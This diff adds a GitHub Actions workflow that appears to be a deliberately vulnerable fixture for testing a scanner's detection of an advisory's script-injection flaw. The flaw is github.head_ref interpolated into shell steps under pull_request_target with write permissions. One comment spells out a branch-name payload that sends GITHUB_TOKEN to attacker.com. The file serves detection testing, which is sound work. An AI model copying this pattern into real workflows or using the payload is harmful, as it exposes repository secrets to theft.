@@ -1,0 +1,47 @@
+# GHSA-7x29-qqmq-v6qc: Script injection in ultralytics/actions via github.head_ref
+# Advisory URL: https://github.com/advisories/GHSA-7x29-qqmq-v6qc
+# Vulnerability Type: Script Injection (High)
+# Expected Detection: CodeInjectionCriticalRule
+#
+# Vulnerable Pattern: github.head_ref is directly interpolated in echo command
+# in pull_request_target context with write permissions
+
+name: Vulnerable ultralytics Script Injection
+
+on:
+  pull_request_target:
+    types: [opened, synchronize]
+
+jobs:
+  process-pr:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+      pull-requests: write
+
+    steps:
+      - name: Checkout PR
+        uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+
+      # Vulnerable: Direct interpolation of github.head_ref in shell command
+      - name: Process branch name
+        run: |
+          echo "Processing branch: ${{ github.head_ref }}"
+          echo "${{ github.head_ref }}" > branch.txt
+
+      # Another vulnerable pattern
+      - name: Create summary
+        run: |
+          # Attacker can create branch with name: test$(curl http://attacker.com/?token=$GITHUB_TOKEN)
+          echo "## PR from branch ${{ github.head_ref }}" >> $GITHUB_STEP_SUMMARY
+          echo "Changes detected" >> $GITHUB_STEP_SUMMARY
+
+      - name: Update PR status
+        run: |
+          # Branch name used in command without sanitization
+          gh pr comment ${{ github.event.pull_request.number }} \
+            --body "Processing branch ${{ github.head_ref }}"
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
